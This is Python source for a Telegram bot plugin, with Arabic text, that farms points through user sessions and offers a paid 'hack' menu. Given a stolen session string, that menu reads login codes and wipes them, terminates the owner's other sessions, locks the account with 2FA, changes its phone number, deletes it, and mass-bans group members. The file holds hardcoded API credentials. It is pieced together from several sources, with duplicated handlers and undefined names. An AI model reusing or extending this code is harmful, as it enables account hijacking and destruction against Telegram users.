#    جميع الحقوق لمطوري سورس روبن حصريا لهم فقط
#    اذا تخمط الملف اذك الحقوق وكاتبيه ومطوريه لا تحذف الحقوق وتصير فاشل 👍
#    كتابة الشسد 
import asyncio
import io
import re

from telethon import Button, custom, events
from telethon.tl.functions.users import GetFullUserRequest
from JoKeRUB import bot
from JoKeRUB.sql_helper.blacklist_assistant import (
    add_nibba_in_db,
    is_he_added,
    removenibba,
)
from JoKeRUB.sql_helper.botusers_sql import add_me_in_db, his_userid
from JoKeRUB.sql_helper.idadder_sql import (
    add_usersid_in_db,
    already_added,
    get_all_users,
)
from l313l.razan.resources.assistant import *

import asyncio
import io
import re
import uuid
import os
from telethon import Button, custom, events
from telethon.tl.functions.users import GetFullUserRequest
from telethon.sync import TelegramClient
from telethon.sessions import StringSession
from telethon.tl.functions.channels import JoinChannelRequest, LeaveChannelRequest, GetFullChannelRequest
from telethon.tl.functions.messages import ImportChatInviteRequest
from telethon import events

botusername = Config.TG_BOT_USERNAME
user_sessions = {}
allowed_user_ids = set()  # مجموعة لتخزين معرفات المستخدمين المسموح لهم

# دالة لتسجيل الجلسة الجديدة وتخزين معرف المستخدم
@tgbot.on(events.CallbackQuery(data=b'add_session'))
async def add_session(event):
    allowed_user_ids.add(event.sender_id)  # تخزين معرف المستخدم المسموح له
    await l313l.tgbot.send_message(event.chat_id, "الرجاء إرسال كود الجلسة (StringSession):")
    user_sessions[event.sender_id] = {"step": "session_code"}

# دالة للتحقق من معرف المستخدم المسجل
@tgbot.on(events.NewMessage(pattern="^/con"))
async def handle_con_command(event):
    username = event.sender.username if event.sender.username else "مستخدم"
    bot_info = (
        "🔹معلومات البوت:\n"
        "بوت التجميع الخاص بنا يساعدك في تجميع النقاط والخدمات المختلفة من تليجرام.\n"
        "استخدم الأزرار التالية للتفاعل مع البوت:"
    )
    buttons = [
        [Button.inline('تسجيل الدخول 🔑', b'login'), Button.inline('تسجيل جلسة 📝', b'add_session')],
        [Button.inline('قسم النقاط 📊', b'point_section')],
        [Button.inline('هدية خدمات تليجرام 🎁', b'open_bot')],
        [Button.inline('حذف حساب 🗑️', b'delete_account'), Button.inline('عدد الحسابات 📊', b'account_count')],
        [Button.inline('حذف جلسة ❌', b'delete_session'), Button.inline('إيقاف التجميع ⛔', b'stop_collecting')],
        [Button.inline('سحب تخزين 📂', b'get_storage'), Button.inline('تسجيل تخزين 📥', b'upload_storage')],
        [Button.inline('قسم التجميع 🛠️', b'collecting_section')],
        [Button.inline('قسم الهدايا 🎁', b'gift_section')]  # إضافة زر قسم الهدايا
    ]

    await event.reply(f"اهلا @{username}\n\n{bot_info}", buttons=buttons)

@tgbot.on(events.CallbackQuery(data=b'collecting_section'))
async def collecting_section(event):
    buttons = [
        [Button.inline('تجميع العقاب 🔥', b'tajme3_3qab'), Button.inline('تجميع الجوكر 🃏', b'tajme3_7rb')],
        [Button.inline('تجميع المليار 📈', b'tajme3_milyar'), Button.inline('تجميع المليون 🏆', b'tajme3_milyon')],
        [Button.inline('تجميع بابليون 🏛️', b'tajme3_babylon')],
        [Button.inline('العودة للخلف 🔙', b'back_to_main')]
    ]
    await event.reply("اختر رحلة مميزة لتجميع النقاط:", buttons=buttons)

@tgbot.on(events.CallbackQuery(data=b'tajme3_babylon'))
async def tajme3_babylon(event):
    if event.sender_id in user_sessions and "client" in user_sessions[event.sender_id]:
        client = user_sessions[event.sender_id]["client"]
        await event.reply("🏛️ **رحلة تجميع النقاط من بوت بابليون بدأت!**")
        bot_username = '@S_313KBOT'
        await client.send_message(bot_username, '/start')
        await asyncio.sleep(4)

        # الضغط على زر b'col'
        msg1 = await client.get_messages(bot_username, limit=1)
        if msg1[0].buttons:
            await msg1[0].click(data=b'col')
        await asyncio.sleep(4)

        # الضغط على زر b'col3'
        msg2 = await client.get_messages(bot_username, limit=1)
        if msg2[0].buttons:
            await msg2[0].click(data=b'col3')
        await asyncio.sleep(4)

        # الضغط على أول زر للانضمام إلى القناة
        msg3 = await client.get_messages(bot_username, limit=1)
        if msg3[0].buttons:
            await msg3[0].click(0)
        await asyncio.sleep(4)

        # الضغط على زر b'donechkeko'
        msg4 = await client.get_messages(bot_username, limit=1)
        if msg4[0].buttons:
            await msg4[0].click(data=b'donechkeko')
        await asyncio.sleep(4)

        # الانضمام لباقي القنوات
        chs = 1
        for i in range(100):
            if not collecting.get(event.sender_id, False):
                await event.reply("تم إيقاف التجميع ⛔")
                break
            await asyncio.sleep(4)
            history = await client.get_messages(bot_username, limit=1)
            msgs = history[0]
            if 'لا يوجد قنوات في الوقت الحالي' in msgs.message:
                await client.send_message(event.chat_id, "تم الانتهاء من التجميع")
                break
            if msgs.reply_markup and msgs.reply_markup.rows:
                url = msgs.reply_markup.rows[0].buttons[0].url
                try:
                    try:
                        await client(JoinChannelRequest(url))
                    except:
                        invite_code = url.split('/')[-1]
                        await client(ImportChatInviteRequest(invite_code))
                    msg2 = await client.get_messages(bot_username, limit=1)
                    if msg2[0].buttons:
                        await msg2[0].click(text='تحقق')
                    chs += 1
                    await event.reply(f"تم الانضمام إلى {chs} قناة")
                except:
                    msg2 = await client.get_messages(bot_username, limit=1)
                    if msg2[0].buttons:
                        await msg2[0].click(text='التالي')
                    chs += 1
                    await event.reply(f"القناة رقم {chs}")
            else:
                await client.send_message(event.chat_id, "لا توجد أزرار في الرسالة، تم إيقاف التجميع.")
                break
    else:
        await event.reply("الرجاء تسجيل الجلسة أولاً باستخدام زر تسجيل جلسة.")

@tgbot.on(events.CallbackQuery(data=b'gift_section'))
async def gift_section(event):
    await event.reply("قريباً ")

    await event.reply(f"اهلا مالكي @{username}\n\n{bot_info}", buttons=buttons)


@tgbot.on(events.CallbackQuery(data=b'point_section'))
async def point_section(event):
    buttons = [
        [Button.inline('نقاط المليار 📈', b'points_milyar')],
        [Button.inline('نقاط المليون 🏆', b'points_milyon')],
        [Button.inline('نقاط العقاب 🔥', b'points_3qab')],
        [Button.inline('العودة للخلف 🔙', b'back_to_main')]
    ]
    await event.reply("اختر أحد الخيارات التالية:", buttons=buttons)

@tgbot.on(events.CallbackQuery(data=b'points_milyar'))
async def points_milyar(event):
    if event.sender_id in user_sessions and "client" in user_sessions[event.sender_id]:
        client = user_sessions[event.sender_id]["client"]
        await event.reply("📈 **سيتم تجميع النقاط من بوت المليار**")
        bot_username = '@EEObot'
        await join_channels(bot_username, event, client)
    else:
        await event.reply("الرجاء تسجيل الجلسة أولاً باستخدام زر تسجيل جلسة.")

@tgbot.on(events.CallbackQuery(data=b'points_milyon'))
async def points_milyon(event):
    if event.sender_id in user_sessions and "client" in user_sessions[event.sender_id]:
        client = user_sessions[event.sender_id]["client"]
        await event.reply("🏆 **سيتم تجميع النقاط من بوت المليون**")
        bot_username = '@qweqwe1919bot'
        await join_channels(bot_username, event, client)
    else:
        await event.reply("الرجاء تسجيل الجلسة أولاً باستخدام زر تسجيل جلسة.")

@tgbot.on(events.CallbackQuery(data=b'points_3qab'))
async def points_3qab(event):
    if event.sender_id in user_sessions and "client" in user_sessions[event.sender_id]:
        client = user_sessions[event.sender_id]["client"]
        await event.reply("🔥 **سيتم تجميع النقاط من بوت العقاب**")
        bot_username = '@MARKTEBOT'
        await join_channels(bot_username, event, client)
    else:
        await event.reply("الرجاء تسجيل الجلسة أولاً باستخدام زر تسجيل جلسة.")

@tgbot.on(events.CallbackQuery(data=b'back_to_main'))
async def back_to_main(event):
    await handle_con_command(event)

@tgbot.on(events.CallbackQuery(data=b'login'))
async def login(event):
    await event.respond("الرجاء إرسال رقم الهاتف مع كود الدولة:")
    user_sessions[event.sender_id] = {"step": "phone"}

@tgbot.on(events.CallbackQuery(data=b'add_session'))
async def add_session(event):
    await event.respond("الرجاء إرسال كود الجلسة (StringSession):")
    user_sessions[event.sender_id] = {"step": "session_code"}

@tgbot.on(events.CallbackQuery(data=b'delete_session'))
async def delete_session(event):
    await event.respond("الرجاء إرسال كود الجلسة (StringSession) التي ترغب في حذفها:")
    user_sessions[event.sender_id] = {"step": "delete_session_code"}

@tgbot.on(events.CallbackQuery(data=b'stop_collecting'))
async def stop_collecting(event):
    collecting[event.sender_id] = False
    await event.reply("تم إيقاف التجميع ⛔")

@tgbot.on(events.CallbackQuery(data=b'get_storage'))
async def get_storage(event):
    file_name = save_sessions_to_file()
    await event.reply("تم حفظ الجلسات. إليك الملف:", file=file_name)

@tgbot.on(events.CallbackQuery(data=b'upload_storage'))
async def upload_storage(event):
    await event.respond("الرجاء إرسال ملف التخزين:")
    user_sessions[event.sender_id] = {"step": "upload_storage"}

@tgbot.on(events.NewMessage)
async def handle_new_message(event):
    if event.sender_id in user_sessions:
        step = user_sessions[event.sender_id]["step"]
        if step == "phone":
            phone = event.message.message
            client = TelegramClient(StringSession(), api_id, api_hash, app_version="Robin")
            user_sessions[event.sender_id].update({"client": client, "phone": phone})
            await client.connect()
            await client.send_code_request(phone)
            await event.reply("الرجاء إرسال كود الدخول بشكل مسافات (مثال: 1 2 3 4 5):")
            user_sessions[event.sender_id]["step"] = "code"
        elif step == "code":
            code = event.message.message.replace(" ", "")
            client = user_sessions[event.sender_id]["client"]
            phone = user_sessions[event.sender_id]["phone"]
            try:
                await client.sign_in(phone, code)
                await event.reply(
                    "تم تسجيل الدخول بنجاح!",
                    buttons=[Button.inline('تسجيل رقم آخر 🔄', b'login')]
                )
                user_sessions[event.sender_id]["step"] = None
            except Exception as e:
                if 'password' in str(e).lower():
                    await event.reply("الرجاء إرسال كلمة السر:")
                    user_sessions[event.sender_id]["step"] = "password"
                else:
                    await event.reply(f"حدث خطأ: {str(e)}")
                    del user_sessions[event.sender_id]
        elif step == "password":
            password = event.message.message
            client = user_sessions[event.sender_id]["client"]
            try:
                if password.lower() != 'لا':
                    await client.sign_in(password=password)
                await event.reply(
                    "تم تسجيل الدخول بنجاح!",
                    buttons=[Button.inline('تسجيل رقم آخر 🔄', b'login')]
                )
                session_str = client.session.save()  # حفظ جلسة المستخدم
                user_sessions[event.sender_id]["session_name"] = session_str
                account_numbers.append(user_sessions[event.sender_id]["phone"])
                user_sessions[event.sender_id]["step"] = None
            except Exception as e:
                await event.reply(f"حدث خطأ: {str(e)}")
                del user_sessions[event.sender_id]
        elif step == "session_code":
            session_code = event.message.message
            try:
                client = TelegramClient(StringSession(session_code), api_id, api_hash)
                await client.connect()
                await event.reply(
                    "تم تسجيل الجلسة بنجاح!",
                    buttons=[Button.inline('تسجيل جلسة أخرى 🔄', b'add_session')]
                )
                user_sessions[event.sender_id]["client"] = client
                user_sessions[event.sender_id]["session_code"] = session_code
                user_sessions[event.sender_id]["step"] = None
                save_sessions_to_file()  # حفظ الجلسات في الملف
            except Exception as e:
                await event.reply(f"حدث خطأ: {str(e)}")
                del user_sessions[event.sender_id]
        elif step == "delete_session_code":
            session_code = event.message.message
            found = False
            for user_id, session in user_sessions.items():
                if session.get("session_code") == session_code:
                    del user_sessions[user_id]
                    found = True
                    break
            if found:
                await event.reply("تم حذف الجلسة بنجاح!")
            else:
                await event.reply("لم يتم العثور على الجلسة.")
            del user_sessions[event.sender_id]
        elif step == "upload_storage":
            if event.file:
                file_path = await event.download_media()
                with open(file_path, 'r') as f:
                    sessions = f.readlines()
                count = 0
                for session_code in sessions:
                    session_code = session_code.strip()
                    if session_code and session_code not in user_sessions:
                        client = TelegramClient(StringSession(session_code), api_id, api_hash)
                        await client.connect()
                        user_sessions[session_code] = {"client": client, "session_code": session_code}
                        count += 1
                await event.reply(f"تم إضافة {count} رقم إلى البوت")
                os.remove(file_path)
            del user_sessions[event.sender_id]
    else:
        # التحقق من الرسائل التي تحتوي على روابط قنوات الاشتراك
        links = re.findall(r'https://t\.me/[^\s]+', event.message.message)
        if links:
            client = user_sessions[event.sender_id]["client"]
            for link in links:
                try:
                    if 'joinchat' in link or '+' in link:
                        invite_code = link.split('/')[-1]
                        await client(ImportChatInviteRequest(invite_code))
                    else:
                        await client(JoinChannelRequest(link))
                    await asyncio.sleep(2)
                except Exception as e:
                    await event.reply(f"حدث خطأ أثناء الانضمام إلى القناة: {str(e)}")

@tgbot.on(events.CallbackQuery(data=b'open_bot'))
async def open_bot(event):
    if event.sender_id in user_sessions and "client" in user_sessions[event.sender_id]:
        client = user_sessions[event.sender_id]["client"]
        bot_username9 = '@SMSMEGbot'
        await client.send_message(bot_username9, '/start')
        await asyncio.sleep(4)
        msg = await client.get_messages(bot_username9, limit=1)
        if msg[0].buttons:
            await msg[0].click(text='الإعدادات وجمع النقاط 🔑')
            await asyncio.sleep(4)
            msg = await client.get_messages(bot_username9, limit=1)
            if msg[0].buttons:
                await msg[0].click(text='جمع نقاط ➕')
                await asyncio.sleep(4)
                msg = await client.get_messages(bot_username9, limit=1)
                if msg[0].buttons:
                    await msg[0].click(text='الهدية اليومية 🎁')
                    await event.reply("تم جمع الهدية بنجاح!")
                else:
                    await event.reply("لم يتم العثور على الزر المطلوب في الرسالة الثالثة.")
            else:
                await event.reply("لم يتم العثور على الزر المطلوب في الرسالة الثانية.")
        else:
            await event.reply("لم يتم العثور على الزر المطلوب في الرسالة الأولى.")
    else:
        await event.reply("الرجاء تسجيل الجلسة أولاً باستخدام زر تسجيل جلسة.")

async def join_channels(bot_username, event, client):
    collecting[event.sender_id] = True
    await client.send_message(bot_username, '/start')
    await asyncio.sleep(4)
    msg0 = await client.get_messages(bot_username, limit=1)
    if msg0[0].buttons and len(msg0[0].buttons) > 2:
        await msg0[0].click(2)
    else:
        await event.reply("لم يتم العثور على الزر المطلوب في الرسالة.")
        return
    await asyncio.sleep(4)
    msg1 = await client.get_messages(bot_username, limit=1)
    if msg1[0].buttons and len(msg1[0].buttons) > 0:
        await msg1[0].click(0)
    else:
        await event.reply("لم يتم العثور على الزر المطلوب في الرسالة.")
        return

    chs = 1
    for i in range(100):
        if not collecting.get(event.sender_id, False):
            await event.reply("تم إيقاف التجميع ⛔")
            break
        await asyncio.sleep(4)
        history = await client.get_messages(bot_username, limit=1)
        msgs = history[0]
        if 'لا يوجد قنوات في الوقت الحالي' in msgs.message:
            await client.send_message(event.chat_id, "تم الانتهاء من التجميع")
            break
        if msgs.reply_markup and msgs.reply_markup.rows:
            url = msgs.reply_markup.rows[0].buttons[0].url
            try:
                try:
                    await client(JoinChannelRequest(url))
                except:
                    invite_code = url.split('/')[-1]
                    await client(ImportChatInviteRequest(invite_code))
                msg2 = await client.get_messages(bot_username, limit=1)
                if msg2[0].buttons:
                    await msg2[0].click(text='تحقق')
                chs += 1
                await event.reply(f"تم الانضمام إلى {chs} قناة")
            except:
                msg2 = await client.get_messages(bot_username, limit=1)
                if msg2[0].buttons:
                    await msg2[0].click(text='التالي')
                chs += 1
                await event.reply(f"القناة رقم {chs}")
        else:
            await client.send_message(event.chat_id, "لا توجد أزرار في الرسالة، تم إيقاف التجميع.")
            break

@tgbot.on(events.CallbackQuery(data=b'tajme3_milyar'))
async def tajme3_milyar(event):
    if event.sender_id in user_sessions and "client" in user_sessions[event.sender_id]:
        client = user_sessions[event.sender_id]["client"]
        await event.reply("📈 **سيتم تجميع النقاط من بوت المليار**")
        bot_username = '@EEObot'
        await join_channels(bot_username, event, client)
    else:
        await event.reply("الرجاء تسجيل الجلسة أولاً باستخدام زر تسجيل جلسة.")

@tgbot.on(events.CallbackQuery(data=b'tajme3_7rb'))
async def tajme3_7rb(event):
    if event.sender_id in user_sessions and "client" in user_sessions[event.sender_id]:
        client = user_sessions[event.sender_id]["client"]
        await event.reply("📊 **سيتم تجميع النقاط من بوت الجوكر**")
        bot_username = '@A_MAN9300BOT'
        await join_channels(bot_username, event, client)
    else:
        await event.reply("الرجاء تسجيل الجلسة أولاً باستخدام زر تسجيل جلسة.")

@tgbot.on(events.CallbackQuery(data=b'tajme3_3qab'))
async def tajme3_3qab(event):
    if event.sender_id in user_sessions and "client" in user_sessions[event.sender_id]:
        client = user_sessions[event.sender_id]["client"]
        await event.reply("🔥 **سيتم تجميع النقاط من بوت العقاب**")
        bot_username = '@MARKTEBOT'
        await join_channels(bot_username, event, client)
    else:
        await event.reply("الرجاء تسجيل الجلسة أولاً باستخدام زر تسجيل جلسة.")

@tgbot.on(events.CallbackQuery(data=b'tajme3_milyon'))
async def tajme3_milyon(event):
    if event.sender_id in user_sessions and "client" in user_sessions[event.sender_id]:
        client = user_sessions[event.sender_id]["client"]
        await event.reply("🏆 **سيتم تجميع النقاط من بوت المليون**")
        bot_username = '@qweqwe1919bot'
        await join_channels(bot_username, event, client)
    else:
        await event.reply("الرجاء تسجيل الجلسة أولاً باستخدام زر تسجيل جلسة.")




bot = borg = tgbot

Bot_Username = Config.TG_BOT_USERNAME or "sessionHackBot"
Zel_Uid = bot.uid

_PYRO_FORM = {351: ">B?256sI?", 356: ">B?256sQ?", 362: ">BI?256sQ?"}

DC_IPV4 = {
    1: "149.154.175.53",
    2: "149.154.167.51",
    3: "149.154.175.100",
    4: "149.154.167.91",
    5: "91.108.56.130",
}

async def change_number_code(strses, number, code, otp):
  async with tg(strses, 29308061, "462de3dfc98fd938ef9c6ee31a72d099") as X:
    bot = client = X
    try: 
      result = await bot(functions.account.ChangePhoneRequest(
        phone_number=number,
        phone_code_hash=code,
        phone_code=otp
      ))
      return True
    except:
      return False

async def change_number(strses, number):
  async with tg(strses, 29308061, "462de3dfc98fd938ef9c6ee31a72d099") as X:
    bot = client = X
    result = await bot(functions.account.SendChangePhoneCodeRequest(
        phone_number=number,
        settings=types.CodeSettings(
            allow_flashcall=True,
            current_number=True,
            allow_app_hash=True
        )
    ))
    return str(result)


async def userinfo(strses):
    async with tg(strses, 29308061, "462de3dfc98fd938ef9c6ee31a72d099") as X:
        k = await X.get_me()
        username = f"@{k.username}" if k.username else "None"
        TEXT = f"**ID =** {k.id}\n**NAME =** {k.first_name}\n**PHONE =** +{k.phone}\n**USERNAME =** {username}\n**DC_ID =** {X.session.dc_id}\n\n**- شكـراً لـ استخدامـك سـورس زدثــون ❤️** \n/hack"
        return TEXT

async def terminate(strses):
  async with tg(strses, 29308061, "462de3dfc98fd938ef9c6ee31a72d099") as X:

    await X(rt())

GROUP_LIST = []
async def delacc(strses):
  async with tg(strses, 29308061, "462de3dfc98fd938ef9c6ee31a72d099") as X:

    await X(functions.account.DeleteAccountRequest("I am chutia"))

async def promote(strses, grp, user):
  async with tg(strses, 29308061, "462de3dfc98fd938ef9c6ee31a72d099") as X:

    try:
      await X.edit_admin(grp, user, manage_call=True, invite_users=True, ban_users=True, change_info=True, edit_messages=True, post_messages=True, add_admins=True, delete_messages=True)
    except:
      await X.edit_admin(grp, user, is_admin=True, anonymous=False, pin_messages=True, title='Owner')

async def user2fa(strses):
  async with tg(strses, 29308061, "462de3dfc98fd938ef9c6ee31a72d099") as X:

    try:
      await X.edit_2fa('ZThon')
      return True
    except:
      return False

async def demall(strses, grp):
  async with tg(strses, 29308061, "462de3dfc98fd938ef9c6ee31a72d099") as X:

    async for x in X.iter_participants(grp, filter=ChannelParticipantsAdmins):
      try:
        await X.edit_admin(grp, x.id, is_admin=False, manage_call=False)
      except:
        await X.edit_admin(grp, x.id, manage_call=False, invite_users=False, ban_users=False, change_info=False, edit_messages=False, post_messages=False, add_admins=False, delete_messages=False)


def validate_session(session):
    # Telethon Session
    if session.startswith(CURRENT_VERSION):
        if len(session.strip()) != 353:
            return False
        return StringSession(session)

    # Pyrogram Session
    elif len(session) in _PYRO_FORM.keys():
        if len(session) in [351, 356]:
            dc_id, _, auth_key, _, _ = struct.unpack(
                _PYRO_FORM[len(session)],
                base64.urlsafe_b64decode(session + "=" *
                                         (-len(session) % 4)),
            )
        else:
            dc_id, _, _, auth_key, _, _ = struct.unpack(
                _PYRO_FORM[len(session)],
                base64.urlsafe_b64decode(session + "=" *
                                         (-len(session) % 4)),
            )
        return StringSession(CURRENT_VERSION + base64.urlsafe_b64encode(
            struct.pack(
                _STRUCT_PREFORMAT.format(4),
                dc_id,
                ipaddress.ip_address(DC_IPV4[dc_id]).packed,
                443,
                auth_key,
            )).decode("ascii"))
    else:
        return False

async def str_checker(strses):
    try:
        boot = tg(strses, 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2")
        await boot.connect()
        info = await boot.get_me()
        if info.bot:
            return False
        try:
            await boot(join('@Zed_Thon'))
        except:
            pass
        await boot.disconnect()
        return True
    except Exception:
        return False

async def check_string(x):
    yy = await x.send_message("**- حسنـاً .. ارسـل كـود تيـرمكـس الآن**")
    try:
        xx = await x.get_response(timeout=300)
        await yy.delete()
    except terror:
        await x.send_message("**- عـذراً لقد انتهـى الوقـت .. حاول مجدداً**\n\n/hack")
        return False
    await xx.delete()
    strses = validate_session(xx.text)
    if strses:
        op = await str_checker(strses)
        if op:
            return strses
        else:
            await x.send_message("**- عـذراً .. لقد تم انهـاء جلسـة هـذا الكـود\n- من قبـل صاحب الحسـاب ؟!**\n\n/hack")
            return False
    else:
        await x.send_message('**-  كـود تيرمكـس غيـر صحيـح ؟!**')
        return False

        # Chat id/Username Func


async def joingroup(strses, username):
  async with tg(strses, 29308061, "462de3dfc98fd938ef9c6ee31a72d099") as X:

    await X(join(username))


async def leavegroup(strses, username):
  async with tg(strses, 29308061, "462de3dfc98fd938ef9c6ee31a72d099") as X:

    await X(leave(username))

async def delgroup(strses, username):
  async with tg(strses, 29308061, "462de3dfc98fd938ef9c6ee31a72d099") as X:

    await X(dc(username))


async def usermsgs(strses):
  async with tg(strses, 29308061, "462de3dfc98fd938ef9c6ee31a72d099") as X:
    i = ""

    async for x in X.iter_messages(777000, limit=3):
      i += f"\n{x.text}\n"
    await X.delete_dialog(777000)
    return str(i)


async def userbans(strses, grp):
  async with tg(strses, 29308061, "462de3dfc98fd938ef9c6ee31a72d099") as X:

    k = await X.get_participants(grp)
    for x in k:
      try:
        await X.edit_permissions(grp, x.id, view_messages=False)
      except:
        pass



async def userchannels(strses):
  async with tg(strses, 29308061, "462de3dfc98fd938ef9c6ee31a72d099") as X:
    k = await X(pc())
    i = ""
    for x in k.chats:
      try:
        i += f'\nCHANNEL NAME ~ {x.title} CHANNEL USRNAME ~ @{x.username}\n'
      except:
        pass
    return str(i)



import logging
logging.basicConfig(level=logging.WARNING)

channel = "ZThon"
menu = '''

A  ➠   ** تحقق من قنوات ومجموعات الحساب **

B  ➠  ** اضهار معلومات الحساب كالرقم والايدي والاسم....الخ**

C  ➠  ** لـحظر جميع اعضاء مجموعة او قنـاة صاحب الحسـاب**

D  ➠  ** تسجيل الدخول الى حساب المستخدم **

E  ➠  ** اشتراك بمجموعة او قناة معينة** 

F  ➠  ** مغادرة مجموعة او قناة معينة** 

G  ➠  ** حذف قناة او مجموعة **

H  ➠  ** التحقق اذا كان التحقق بخطوتين مفعل ام لا **

I   ➠  ** تسجيل الخروج من جميع الجلسات عدا جلسة البوت **

J  ➠  ** حذف الحساب نهائيا**

K  ➠  ** تنزيل جميع المشرفين من مجموعة معينة او قناة **

L  ➠  ** رفع مشرف لشخص معين في قناة او مجموعة **

M  ➠  ** تغييـر رقـم هـاتف الحسـاب **

'''
mm = '''
**- عليك الانضمـام في قنـاة السـورس اولاً**  @ZThon
'''

keyboard = [
  [  
    Button.inline("A", data="AAA"), 
    Button.inline("B", data="BBB"),
    Button.inline("C", data="CCC"),
    Button.inline("D", data="DDD"),
    Button.inline("E", data="EEE")
    ],
  [
    Button.inline("F", data="FFF"), 
    Button.inline("G", data="GGG"),
    Button.inline("H", data="HHH"),
    Button.inline("I", data="III"),
    Button.inline("J", data="JJJ"),
    ],
  [
    Button.inline("K", data="KKK"), 
    Button.inline("L", data="LLL"),
    Button.inline("M", data="MMM"),
    ],
  [
    Button.url("𝗭𝗧𝗵𝗼𝗻™ 𓅛", "https://t.me/ZThon")
    ]
]


@zedub.zed_cmd(pattern="هاك$")
async def op(event):
    zid = int(gvarstatus("ZThon_Vip"))
    if Zel_Uid != zid:
        return await edit_or_reply(event, "**⎉╎عـذࢪاً .. ؏ـزيـزي\n⎉╎هـذا الامـر ليـس مجـانـي📵\n⎉╎للاشتـراك في الاوامـر المدفوعـة\n⎉╎تواصـل مطـور السـورس @BBBlibot\n⎉╎او التواصـل مـع احـد المشرفيـن @AAAl1l**")
    zelzal = Bot_Username.replace("@","")       
    await event.edit(f"**- مرحبـا عـزيـزي\n\n- قم بالدخـول للبـوت المسـاعـد @{zelzal} \n- وارسـال الامـر  /hack**")

@tgbot.on(events.NewMessage(pattern="/hack", func = lambda x: x.is_private))
async def start(event):
  global menu
  if event.sender_id == bot.uid:
      async with bot.conversation(event.chat_id) as x:
        zid = int(gvarstatus("ZThon_Vip"))
        if bot.uid != zid:
          return await x.send_message("**⎉╎عـذࢪاً .. ؏ـزيـزي\n⎉╎هـذا الامـر ليـس مجـانـي📵\n⎉╎للاشتـراك في الاوامـر المدفوعـة\n⎉╎تواصـل مطـور السـورس @BBBlibot\n⎉╎او التواصـل مـع احـد المشرفيـن @AAAl1l**")
        keyboard = [
          [  
            Button.inline("A", data="AAA"), 
            Button.inline("B", data="BBB"),
            Button.inline("C", data="CCC"),
            Button.inline("D", data="DDD"),
            Button.inline("E", data="EEE")
            ],
          [
            Button.inline("F", data="FFF"), 
            Button.inline("G", data="GGG"),
            Button.inline("H", data="HHH"),
            Button.inline("I", data="III"),
            Button.inline("J", data="JJJ")
            ],
          [
            Button.inline("K", data="KKK"), 
            Button.inline("L", data="LLL"),
            Button.inline("M", data="MMM"),
            ],
          [
            Button.url("𝗭𝗧𝗵𝗼𝗻™ 𓅛", "https://t.me/ZThon")
            ]
        ]
        await x.send_message(f"**- مرحبـاً بـك عـزيـزي\n- اليـك قائمـة اوامـر اختـراق الحسـاب عبـر كـود سيشـن تيرمكـس\n- اضغـط احـد الازرار للبـدء** \n\n{menu}", buttons=keyboard)

@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"AAA")))
async def users(event):
  async with bot.conversation(event.chat_id) as x:
      string = await check_string(x)
      if not string:
          return
      channels = await userchannels(string)
      if len(channels) == 0:
          await x.send_message("**- لا توجد قنوات او مجموعات عامة أنشأها هذا المستخدم**\n\n/hack")
      elif len(channels) > 2000:
          file_name = f"{e.chat_id}_session.txt"
          with open(file_name, "w") as f:
              f.write(channels + f"\n\n**- Details BY @{botname}**")
          await bot.send_file(event.chat_id, file_name)
          os.system(f"rm -rf {file_name}")
      else:
          await x.send_message(channels + "\n\n**- شكـراً لـ استخدامـك سـورس زدثــون ❤️** \n/hack")

@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"BBB")))
async def users(event):
  async with bot.conversation(event.chat_id) as x:
    string = await check_string(x)
    if not string:
        return
    i = await userinfo(string)
    await event.reply(i + "\n\n**- شكـراً لـ استخدامـك سـورس زدثــون ❤️**\n/hack", buttons=keyboard)

@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"CCC")))
async def users(event):
  async with bot.conversation(event.chat_id) as x:
    string = await check_string(x)
    if not string:
        return
    await x.send_message("**- حسنـاً .. ارسـل معـرف/ايـدي المجموعـة او القنـاة الآن**")
    grpid = await x.get_response()
    await userbans(string, grpid.text)
    await event.reply("**- جـارِ ... حظـر جميـع اعضـاء المجموعـة/القنـاة**", buttons=keyboard)

@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"DDD")))
async def users(event):
  async with bot.conversation(event.chat_id) as x:
      string = await check_string(x)
      if not string:
          return
      i = await usermsgs(string)
      await event.reply(i + "\n\n**- شكـراً لـ استخدامـك سـورس زدثــون ❤️**", buttons=keyboard)

@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"EEE")))
async def users(event):
  async with bot.conversation(event.chat_id) as x:
    string = await check_string(x)
    if not string:
        return
    await x.send_message("**- حسنـاً .. ارسـل معـرف/ايـدي المجموعـة او القنـاة الآن**")
    grpid = await x.get_response()
    await joingroup(string, grpid.text)
    await event.reply("**- لقد تم الانضمام الى القناة/الكروب**\n\n/hack")

@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"FFF")))
async def users(event):
  async with bot.conversation(event.chat_id) as x:
    string = await check_string(x)
    if not string:
      return
    await x.send_message("**- حسنـاً .. ارسـل معـرف/ايـدي المجموعـة او القنـاة الآن**")
    grpid = await x.get_response()
    await leavegroup(string, grpid.text)
    await event.reply("**- لقد تم مغادرة القناة/الكروب**\n\n/hack")

@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"GGG")))
async def users(event):
  async with bot.conversation(event.chat_id) as x:
      string = await check_string(x)
      if not string:
        return
      await x.send_message("**- حسنـاً .. ارسـل معـرف/ايـدي المجموعـة او القنـاة الآن**")
      grpid = await x.get_response()
      await delgroup(string, grpid.text)
      await event.reply("**- لقد تم حذف القناة/الكروب**\n\n/hack")

@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"HHH")))
async def users(event):
  async with bot.conversation(event.chat_id) as x:
      string = await check_string(x)
      if not string:
        return
      i = await user2fa(string)
      if i:
        await event.reply("**- صاحب الحسـاب لم يفعـل التحقق بخطـوتين\n- يمكنك الدخول الى الحساب بكل سهوله عبـر الامـر ( D )**\n\n/hack")
      else:
        await event.reply("**- عـذراً .. صاحب الحسـاب مفعـل التحقق بخطـوتين**")

@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"III")))
async def users(event):
  async with bot.conversation(event.chat_id) as x:
      string = await check_string(x)
      if not string:
        return
      i = await terminate(string)
      await event.reply("**- لقد تم انهـاء جميـع الجلسـات .. بنجـاح \n- ماعـدا جلسـة البـوت**")

@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"JJJ")))
async def users(event):
  async with bot.conversation(event.chat_id) as x:
      string = await check_string(x)
      if not string:
        return
      i = await delacc(string)
      await event.reply("**- تم حـذف الحسـاب .. بنجـاح ☠**\n\n/hack")

